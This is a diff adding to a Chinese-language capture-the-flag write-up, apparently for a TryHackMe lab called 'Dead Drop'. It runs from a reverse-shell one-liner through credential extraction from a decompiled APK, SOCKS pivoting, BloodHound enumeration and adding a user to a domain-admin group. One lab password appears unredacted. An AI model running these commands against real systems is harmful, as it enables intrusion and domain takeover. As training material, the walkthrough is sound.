@@ -91,4 +91,100 @@ throw new Error(execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ip 44
 
 ## 以 svc-drop 身份访问ssh
 
-我们测试了凭据，并尝试通过 SSH 登录到 Web 服务器，登录成功。在用户主目录中，我们找到了一个 backup 目录。
+我们测试了凭据，并尝试通过 `SSH` 登录到 `Web` 服务器，登录成功。在用户主目录中，我们找到了一个 backup 目录。
+```bash
+ssh svc-drop@192.168.11.200
+```
+![截图](./Dead-Drop/15.png)
+
+## 以 j.harris 身份访问
+在`backup`目录里发现`deaddrop-mobile.apk`文件
+
+`.apk` 是用于在 Android 设备上分发和安装应用程序的文件格式。它本质上是一个 ZIP 压缩包，其中包含应用程序的编译代码、资源、资产和清单文件。要检查 `deaddrop-mobile.apk` ，我们可以使用 `jadx`，这是一个反编译器，可以将 Dalvik 字节码转换回可读的 Java 源代码，从而可以分析应用程序的逻辑、硬编码的密钥和 API 端点。
+
+### 提取凭证
+但首先，我们需要将 APK 文件下载到我们的机器上，我们使用`scp`下载目标机上的文件，在这之前需要查看目标机子的当前目录
+
+
+![截图](./Dead-Drop/16.png)
+接下来，我们在目标设备上运行以下命令。输入密码后稍等片刻，`APK` 文件就会出现在我们的设备上。
+
+```bash
+scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
+```
+![截图](./Dead-Drop/17.png)
+
+现在我们可以使用 `jadx` 反编译 `apk` 文件了
+![截图](./Dead-Drop/18.png)
+
+我们寻找相关资质，并找到了一些。
+```bash
+grep -ir password
+```
+经发现在`Config.java`里发现了密码
+![截图](./Dead-Drop/19.png)
+
+仔细观察，便可发现是 `j.harris` 的资历。
+![截图](./Dead-Drop/20.png)
+
+### proxychains设置
+我们在`/etc/hosts`文件下添加以下条目
+```bash
+192.168.11.100     DEADDROP-DC.deaddrop.loc deaddrop.loc DEADDROP-DC
+```
+把`/etc/proxychains.conf`里的`socks4`改为`1080`
+![截图](./Dead-Drop/21.png)
+
+启动ssh动态端口转发（建立SCOKS5代理隧道）
+```bash
+ssh -f -D 1080 svc-drop@192.168.11.200 -N
+```
+进行端口扫描发现域名
+```bash
+proxychains nmap -Pn -T4 -sT -p 389,636 --script ldap-rootdse 192.168.11.100
+```
+![截图](./Dead-Drop/23.png)
+
+知道域名后，测试链接性
+```bash
+proxychains nxc smb 192.168.11.100 -d deaddrop.loc -u 'j.harris' -p 'REDACTED'
+```
+![截图](./Dead-Drop/22.png)
+
+看到`Pwn3d!`说明已经获得域的权限，接下来查看共享文件
+![截图](./Dead-Drop/24.png)
+发现`ADMIN$` , `C$`拥有读写权限，接下来我们用BloodHound 枚举域
+
+## BloodHound 枚举
+在tryhackme里用bloodhound-python，容易因`DNS`超时而链接失败
+```bash
+proxychains bloodhound-python -u 'j.harris' -p 'REDACTED' -d deaddrop.loc -dc DEADDROP-DC.deaddrop.loc -ns 192.168.11.100 -c All --zip --dns-tcp
+```
+![截图](./Dead-Drop/25.png)
+
+输入以下指令进行版本降级
+```bash
+/usr/local/pyenv/versions/3.8.20/bin/pip install --force-reinstall 'bloodhound==1.7.2'
+```
+短暂等待后重新输入上步指令，等待返回`20260812154813_bloodhound.zip`文件
+![截图](./Dead-Drop/26.png)
+
+启动`Neo4j`服务，打开BloodHound，输入以下命令
+```bash
+JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 neo4j-admin set-initial-password 'neo4j'
+```
+```bash
+JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 neo4j start
+```
+将文件进行上传，查看组成员，我们发现DOMAIN ADMIN 在域上，理论上我们可以把成员直接添加到域管理员上
+![截图](./Dead-Drop/27.png)
+而我们又发现`ITSUPPORT-ADMINS`属于`DOMAIN ADMINS`，所以我们可以把用户`j.harris`,添加到`ITSUPPORT-ADMINS`里，从而获取到域管理员权限。
+![截图](./Dead-Drop/28.png)
+```bash
+proxychains net -dc-ip 192.168.11.100 -target-ip 192.168.11.100 'deaddrop.loc/j.harris:REDACTED@DEADDROP-DC.deaddrop.loc' group -name "ITSupport-Admins" -join j.harris
+```
+添加后输入以下命令即可查看flag
+```bash
+proxychains nxc smb 192.168.11.100 -d deaddrop.loc -u 'j.harris' -p 'DropsOfJupiter2026!' -x 'type C:\Users\Administrator\Desktop\flag.txt'
+```
+![截图](./Dead-Drop/29.png)
